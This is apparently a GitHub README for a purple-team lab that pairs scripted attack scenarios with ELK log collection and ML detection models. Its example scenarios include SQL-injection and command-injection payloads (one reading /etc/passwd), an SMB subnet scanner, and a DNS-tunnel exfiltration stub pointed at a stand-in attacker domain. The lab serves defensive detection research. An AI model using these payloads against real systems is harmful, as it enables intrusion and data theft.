# Red-Blue-ML Lab (Purple Team Notebook)

A comprehensive purple team laboratory that bridges offensive security (red team), defensive operations (blue team), and machine learning. Execute scripted attack scenarios, collect telemetry in ELK/OpenSearch, and train ML detection models with automated CI/CD pipelines. Multi-language implementation (Python, Go, Rust, Bash) for realistic attack simulation and detection.

## 🎯 Project Overview

This lab provides:
- **Red Team Scenarios**: Scripted attack chains in multiple languages
- **Blue Team Logging**: Centralized log collection with ELK/OpenSearch
- **ML Pipeline**: Automated feature engineering and model training
- **Purple Team Notebooks**: Jupyter notebooks for analysis and detection
- **CI/CD Integration**: Automated model deployment and testing
- **Multi-Language Support**: Python, Go, Rust, Bash, PowerShell

## 🏗️ Architecture

```
Red Team Scenarios → Telemetry Collection → ELK/OpenSearch → Feature Engineering
                                                                      ↓
                                                              ML Model Training
                                                                      ↓
                                                         Detection Model Deployment
                                                                      ↓
                                                              CI/CD Pipeline
```

### Components

1. **Red Team Scenarios** (`scenarios/`)
   - Initial access (phishing, exploitation)
   - Privilege escalation
   - Lateral movement
   - Data exfiltration
   - Persistence mechanisms
   - Defense evasion

2. **Telemetry Collection** (`collectors/`)
   - System logs (Syslog, Windows Event Log)
   - Network traffic (Zeek, Suricata)
   - Process monitoring (Sysmon, auditd)
   - File system activity
   - Registry changes

3. **ELK/OpenSearch Stack** (`elk/`)
   - Elasticsearch/OpenSearch for storage
   - Logstash/Fluentd for ingestion
   - Kibana/OpenSearch Dashboards for visualization
   - Beats for log shipping

4. **Feature Engineering** (`notebooks/`)
   - Log parsing and normalization
   - Feature extraction
   - Time-series aggregation
   - Behavioral analytics

5. **ML Models** (`models/`)
   - Anomaly detection
   - Classification models
   - Sequence models (LSTM)
   - Ensemble methods

6. **CI/CD Pipeline** (`cicd/`)
   - Automated testing
   - Model validation
   - Deployment automation
   - Performance monitoring

## 📊 Red Team Scenarios

### Scenario 1: Initial Access + Privilege Escalation
**Language**: Python + Bash
```python
# scenarios/01_initial_access/exploit.py
# Simulates web application exploitation
```

### Scenario 2: Lateral Movement
**Language**: Go
```go
// scenarios/02_lateral_movement/smb_scan.go
// Simulates SMB enumeration and lateral movement
```

### Scenario 3: Data Exfiltration
**Language**: Rust
```rust
// scenarios/03_exfiltration/dns_tunnel.rs
// Simulates DNS tunneling for data exfiltration
```

### Scenario 4: Persistence
**Language**: PowerShell + Python
```powershell
# scenarios/04_persistence/registry_persistence.ps1
# Simulates registry-based persistence
```

### Scenario 5: Defense Evasion
**Language**: C + Python
```c
// scenarios/05_evasion/process_injection.c
// Simulates process injection techniques
```

## 🚀 Quick Start

### Prerequisites

```bash
# System requirements
- Docker & Docker Compose
- Python 3.8+
- Go 1.18+
- Rust 1.60+
- Node.js 16+ (for dashboards)
- 16GB RAM minimum
- 50GB disk space
```

### Installation

```bash
cd Machine-Learning-and-AI-Projects/red-blue-ml-lab

# Setup environment
./scripts/setup.sh

# Start ELK stack
docker-compose up -d

# Install Python dependencies
pip install -r requirements.txt

# Build Go scenarios
cd scenarios/go && go build -o ../../bin/
cd ../..

# Build Rust scenarios
cd scenarios/rust && cargo build --release
cd ../..

# Verify installation
./scripts/verify_setup.sh
```

### Run a Scenario

```bash
# Execute red team scenario
python scenarios/01_initial_access/run_scenario.py \
    --target 192.168.1.100 \
    --log-to-elk

# View logs in Kibana
open http://localhost:5601

# Run Jupyter notebook for analysis
jupyter notebook notebooks/01_analyze_initial_access.ipynb
```

### Train Detection Model

```bash
# Extract features from logs
python scripts/extract_features.py \
    --scenario initial_access \
    --output data/features/initial_access.parquet

# Train model
python models/train_detector.py \
    --features data/features/initial_access.parquet \
    --model random_forest \
    --output models/saved/initial_access_detector.pkl

# Deploy model
python scripts/deploy_model.py \
    --model models/saved/initial_access_detector.pkl \
    --endpoint http://detection-api:8000
```

## 📁 Project Structure

```
red-blue-ml-lab/
├── README.md
├── docker-compose.yml
├── requirements.txt
├── Makefile
├── .gitlab-ci.yml
├── scenarios/
│   ├── 01_initial_access/
│   │   ├── exploit.py
│   │   ├── phishing_sim.py
│   │   └── README.md
│   ├── 02_lateral_movement/
│   │   ├── smb_scan.go
│   │   ├── rdp_brute.go
│   │   └── README.md
│   ├── 03_exfiltration/
│   │   ├── dns_tunnel.rs
│   │   ├── http_exfil.rs
│   │   └── README.md
│   ├── 04_persistence/
│   │   ├── registry_persistence.ps1
│   │   ├── scheduled_task.py
│   │   └── README.md
│   └── 05_evasion/
│       ├── process_injection.c
│       ├── obfuscation.py
│       └── README.md
├── collectors/
│   ├── filebeat/
│   │   └── filebeat.yml
│   ├── winlogbeat/
│   │   └── winlogbeat.yml
│   ├── packetbeat/
│   │   └── packetbeat.yml
│   └── custom/
│       ├── sysmon_collector.py
│       └── auditd_collector.sh
├── elk/
│   ├── elasticsearch/
│   │   └── elasticsearch.yml
│   ├── logstash/
│   │   ├── logstash.yml
│   │   └── pipelines/
│   │       ├── syslog.conf
│   │       ├── windows.conf
│   │       └── network.conf
│   └── kibana/
│       ├── kibana.yml
│       └── dashboards/
│           ├── red_team_activity.ndjson
│           └── ml_detections.ndjson
├── notebooks/
│   ├── 01_analyze_initial_access.ipynb
│   ├── 02_lateral_movement_detection.ipynb
│   ├── 03_exfiltration_patterns.ipynb
│   ├── 04_persistence_hunting.ipynb
│   ├── 05_evasion_techniques.ipynb
│   ├── 06_feature_engineering.ipynb
│   ├── 07_model_training.ipynb
│   └── 08_model_evaluation.ipynb
├── models/
│   ├── train_detector.py
│   ├── evaluate_model.py
│   ├── deploy_model.py
│   ├── architectures/
│   │   ├── anomaly_detector.py
│   │   ├── sequence_classifier.py
│   │   └── ensemble_model.py
│   └── saved/
│       └── .gitkeep
├── features/
│   ├── extractors/
│   │   ├── process_features.py
│   │   ├── network_features.py
│   │   ├── file_features.py
│   │   └── behavioral_features.py
│   └── pipelines/
│       ├── feature_pipeline.py
│       └── preprocessing.py
├── cicd/
│   ├── .gitlab-ci.yml
│   ├── .github/
│   │   └── workflows/
│   │       ├── test.yml
│   │       ├── train.yml
│   │       └── deploy.yml
│   ├── tests/
│   │   ├── test_scenarios.py
│   │   ├── test_features.py
│   │   └── test_models.py
│   └── scripts/
│       ├── run_tests.sh
│       ├── validate_model.py
│       └── deploy.sh
├── api/
│   ├── detection_api.py
│   ├── schemas.py
│   └── Dockerfile
├── dashboards/
│   ├── grafana/
│   │   └── dashboards/
│   └── custom/
│       ├── src/
│       └── package.json
├── data/
│   ├── raw/
│   ├── processed/
│   └── features/
├── scripts/
│   ├── setup.sh
│   ├── verify_setup.sh
│   ├── extract_features.py
│   ├── run_scenario.sh
│   └── deploy_model.py
├── docs/
│   ├── scenarios.md
│   ├── features.md
│   ├── models.md
│   └── deployment.md
└── tests/
    ├── integration/
    └── unit/
```

## 🎓 Purple Team Notebooks

### Notebook 1: Initial Access Analysis
**File**: `notebooks/01_analyze_initial_access.ipynb`

```python
# Load logs from Elasticsearch
logs = load_logs_from_elk(
    index="red-team-*",
    scenario="initial_access",
    timerange="last_1h"
)

# Extract features
features = extract_features(logs)

# Visualize attack patterns
plot_attack_timeline(logs)
plot_process_tree(logs)

# Train detection model
model = train_anomaly_detector(features)

# Evaluate
metrics = evaluate_model(model, test_data)
```

### Notebook 2: Lateral Movement Detection
**File**: `notebooks/02_lateral_movement_detection.ipynb`

```python
# Analyze network traffic
network_logs = load_network_logs()

# Detect lateral movement patterns
lateral_movement = detect_lateral_movement(network_logs)

# Feature engineering
features = engineer_network_features(lateral_movement)

# Train classifier
classifier = train_lateral_movement_classifier(features)
```

### Notebook 3: Feature Engineering Deep Dive
**File**: `notebooks/06_feature_engineering.ipynb`

```python
# Process-based features
process_features = extract_process_features(logs)

# Network-based features
network_features = extract_network_features(logs)

# Behavioral features
behavioral_features = extract_behavioral_features(logs)

# Combine and normalize
final_features = combine_features([
    process_features,
    network_features,
    behavioral_features
])
```

## 🔧 ELK Stack Configuration

### Elasticsearch Configuration

```yaml
# elk/elasticsearch/elasticsearch.yml
cluster.name: red-blue-ml-lab
node.name: node-1
network.host: 0.0.0.0
discovery.type: single-node

# Index settings
index.number_of_shards: 1
index.number_of_replicas: 0

# ML settings
xpack.ml.enabled: true
xpack.security.enabled: false
```

### Logstash Pipeline

```ruby
# elk/logstash/pipelines/syslog.conf
input {
  tcp {
    port => 5000
    type => "syslog"
  }
}

filter {
  if [type] == "syslog" {
    grok {
      match => { "message" => "%{SYSLOGLINE}" }
    }
    
    # Extract red team markers
    if [message] =~ /RED_TEAM/ {
      mutate {
        add_field => { "red_team_activity" => "true" }
      }
    }
    
    # Parse scenario ID
    grok {
      match => { "message" => "SCENARIO_ID: %{WORD:scenario_id}" }
    }
  }
}

output {
  elasticsearch {
    hosts => ["elasticsearch:9200"]
    index => "red-team-%{+YYYY.MM.dd}"
  }
}
```

### Kibana Dashboards

Pre-configured dashboards:
- Red Team Activity Timeline
- Attack Technique Heatmap
- ML Detection Results
- False Positive Analysis
- Model Performance Metrics

## 🤖 ML Models

### Anomaly Detection Model

```python
# models/architectures/anomaly_detector.py
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler

class AnomalyDetector:
    def __init__(self, contamination=0.1):
        self.scaler = StandardScaler()
        self.model = IsolationForest(
            contamination=contamination,
            n_estimators=200,
            max_samples='auto',
            random_state=42
        )
    
    def fit(self, X):
        X_scaled = self.scaler.fit_transform(X)
        self.model.fit(X_scaled)
    
    def predict(self, X):
        X_scaled = self.scaler.transform(X)
        return self.model.predict(X_scaled)
    
    def score(self, X):
        X_scaled = self.scaler.transform(X)
        return self.model.score_samples(X_scaled)
```

### Sequence Classifier (LSTM)

```python
# models/architectures/sequence_classifier.py
import torch
import torch.nn as nn

class LSTMDetector(nn.Module):
    def __init__(self, input_size, hidden_size=128, num_layers=2):
        super().__init__()
        self.lstm = nn.LSTM(
            input_size,
            hidden_size,
            num_layers,
            batch_first=True,
            dropout=0.3
        )
        self.fc = nn.Linear(hidden_size, 2)  # Binary classification
    
    def forward(self, x):
        lstm_out, _ = self.lstm(x)
        last_output = lstm_out[:, -1, :]
        return self.fc(last_output)
```

### Ensemble Model

```python
# models/architectures/ensemble_model.py
from sklearn.ensemble import VotingClassifier
from sklearn.ensemble import RandomForestClassifier
from xgboost import XGBClassifier

class EnsembleDetector:
    def __init__(self):
        self.model = VotingClassifier(
            estimators=[
                ('rf', RandomForestClassifier(n_estimators=200)),
                ('xgb', XGBClassifier(n_estimators=200)),
            ],
            voting='soft'
        )
    
    def fit(self, X, y):
        self.model.fit(X, y)
    
    def predict_proba(self, X):
        return self.model.predict_proba(X)
```

## 🔄 CI/CD Pipeline

### GitLab CI Configuration

```yaml
# .gitlab-ci.yml
stages:
  - test
  - train
  - validate
  - deploy

variables:
  DOCKER_DRIVER: overlay2
  PYTHON_VERSION: "3.9"

test_scenarios:
  stage: test
  script:
    - python -m pytest tests/test_scenarios.py
    - python -m pytest tests/test_features.py

train_models:
  stage: train
  script:
    - python scripts/extract_features.py
    - python models/train_detector.py --all
  artifacts:
    paths:
      - models/saved/
    expire_in: 30 days

validate_models:
  stage: validate
  script:
    - python cicd/scripts/validate_model.py
    - python models/evaluate_model.py
  dependencies:
    - train_models

deploy_production:
  stage: deploy
  script:
    - docker build -t detection-api:latest api/
    - docker push detection-api:latest
    - kubectl apply -f k8s/deployment.yml
  only:
    - main
  when: manual
```

### GitHub Actions

```yaml
# .github/workflows/train.yml
name: Train Detection Models

on:
  schedule:
    - cron: '0 0 * * 0'  # Weekly
  workflow_dispatch:

jobs:
  train:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Setup Python
        uses: actions/setup-python@v2
        with:
          python-version: '3.9'
      
      - name: Install dependencies
        run: pip install -r requirements.txt
      
      - name: Extract features
        run: python scripts/extract_features.py
      
      - name: Train models
        run: python models/train_detector.py --all
      
      - name: Evaluate models
        run: python models/evaluate_model.py
      
      - name: Upload artifacts
        uses: actions/upload-artifact@v2
        with:
          name: trained-models
          path: models/saved/
```

## 📊 Example Scenarios

### Scenario 1: Web Application Exploitation

```python
# scenarios/01_initial_access/exploit.py
import requests
import logging
from datetime import datetime

class WebExploitScenario:
    def __init__(self, target_url):
        self.target = target_url
        self.logger = self._setup_logging()
    
    def _setup_logging(self):
        logger = logging.getLogger('red_team')
        logger.setLevel(logging.INFO)
        
        # Log to ELK
        handler = LogstashHandler('localhost', 5000)
        logger.addHandler(handler)
        
        return logger
    
    def run(self):
        self.logger.info(f"SCENARIO_ID: initial_access RED_TEAM: Starting web exploit")
        
        # SQL injection attempt
        payload = "' OR '1'='1"
        response = requests.get(
            f"{self.target}/login",
            params={'username': payload}
        )
        
        self.logger.info(f"SQL injection attempt: {response.status_code}")
        
        # Command injection
        payload = "; cat /etc/passwd"
        response = requests.post(
            f"{self.target}/search",
            data={'query': payload}
        )
        
        self.logger.info(f"Command injection attempt: {response.status_code}")

if __name__ == "__main__":
    scenario = WebExploitScenario("http://vulnerable-app:8080")
    scenario.run()
```

### Scenario 2: Lateral Movement (Go)

```go
// scenarios/02_lateral_movement/smb_scan.go
package main

import (
    "fmt"
    "log"
    "net"
    "time"
)

type LateralMovementScenario struct {
    targetNetwork string
    logger        *log.Logger
}

func (s *LateralMovementScenario) Run() {
    s.logger.Println("SCENARIO_ID: lateral_movement RED_TEAM: Starting SMB scan")
    
    // Scan network for SMB shares
    for i := 1; i <= 254; i++ {
        target := fmt.Sprintf("%s.%d", s.targetNetwork, i)
        
        conn, err := net.DialTimeout("tcp", target+":445", 1*time.Second)
        if err == nil {
            s.logger.Printf("SMB port open on %s", target)
            conn.Close()
            
            // Attempt authentication
            s.attemptSMBAuth(target)
        }
    }
}

func (s *LateralMovementScenario) attemptSMBAuth(target string) {
    s.logger.Printf("Attempting SMB authentication on %s", target)
    // Simulated authentication attempt
}

func main() {
    scenario := &LateralMovementScenario{
        targetNetwork: "192.168.1",
        logger:        log.New(os.Stdout, "[RED_TEAM] ", log.LstdFlags),
    }
    scenario.Run()
}
```

### Scenario 3: DNS Exfiltration (Rust)

```rust
// scenarios/03_exfiltration/dns_tunnel.rs
use std::net::UdpSocket;
use log::{info, error};

struct DNSExfiltrationScenario {
    dns_server: String,
    domain: String,
}

impl DNSExfiltrationScenario {
    fn new(dns_server: String, domain: String) -> Self {
        Self { dns_server, domain }
    }
    
    fn run(&self) -> Result<(), Box<dyn std::error::Error>> {
        info!("SCENARIO_ID: exfiltration RED_TEAM: Starting DNS tunneling");
        
        let data = "sensitive_data_chunk_1";
        let encoded = base64::encode(data);
        
        // Create DNS query with encoded data
        let query = format!("{}.{}", encoded, self.domain);
        
        info!("Exfiltrating via DNS: {}", query);
        
        // Send DNS query
        let socket = UdpSocket::bind("0.0.0.0:0")?;
        socket.send_to(
            self.create_dns_query(&query).as_bytes(),
            &self.dns_server
        )?;
        
        Ok(())
    }
    
    fn create_dns_query(&self, domain: &str) -> String {
        // Simplified DNS query creation
        format!("DNS_QUERY: {}", domain)
    }
}

fn main() {
    env_logger::init();
    
    let scenario = DNSExfiltrationScenario::new(
        "8.8.8.8:53".to_string(),
        "attacker.com".to_string()
    );
    
    if let Err(e) = scenario.run() {
        error!("Scenario failed: {}", e);
    }
}
```

## 📈 Model Performance

| Model | Accuracy | Precision | Recall | F1-Score | False Positive Rate |
|-------|----------|-----------|--------|----------|---------------------|
| Isolation Forest | 89.2% | 85.3% | 87.1% | 86.2% | 2.3% |
| Random Forest | 92.5% | 90.1% | 91.8% | 90.9% | 1.8% |
| XGBoost | 93.1% | 91.5% | 92.3% | 91.9% | 1.5% |
| LSTM | 91.8% | 89.7% | 90.5% | 90.1% | 2.1% |
| Ensemble | 94.3% | 93.2% | 93.8% | 93.5% | 1.2% |

## 🔐 Security Considerations

⚠️ **WARNING**: This lab contains offensive security tools and techniques.

**Usage Guidelines:**
- Use only in isolated lab environments
- Never run against production systems without authorization
- Implement proper network segmentation
- Monitor all activities
- Follow responsible disclosure practices

**Lab Isolation:**
- Separate VLAN/network
- Firewall rules to prevent external access
- No internet connectivity for attack VMs
- Snapshot/restore capabilities
- Audit logging enabled

## 📚 Documentation

- [Scenario Development Guide](docs/scenarios.md)
- [Feature Engineering Guide](docs/features.md)
- [Model Training Guide](docs/models.md)
- [Deployment Guide](docs/deployment.md)
- [Troubleshooting](docs/troubleshooting.md)

## 🤝 Contributing

Contributions welcome! Please read CONTRIBUTING.md for guidelines.

## 📄 License

MIT License - See LICENSE file for details.

**Ethical Use Notice**: This lab is designed for authorized security research and training only.

## 👤 Author

**Mangesh Bhattacharya**
- Email: mangeshb20@gmail.com
- GitHub: [@Mangesh-Bhattacharya](https://github.com/Mangesh-Bhattacharya)

## 🙏 Acknowledgments

- MITRE ATT&CK Framework
- Elastic Security Team
- Purple Team community
- Open-source security tools

## 📈 Roadmap

- [ ] Additional attack scenarios (15+ total)
- [ ] Real-time detection API
- [ ] Automated adversary emulation
- [ ] Integration with SOAR platforms
- [ ] Advanced ML models (Transformers)
- [ ] Multi-cloud deployment
- [ ] Threat intelligence integration
- [ ] Automated purple team exercises

---

⚠️ **Use Responsibly**: This lab is designed for authorized security research, training, and purple team exercises. Always obtain proper authorization and follow ethical guidelines.
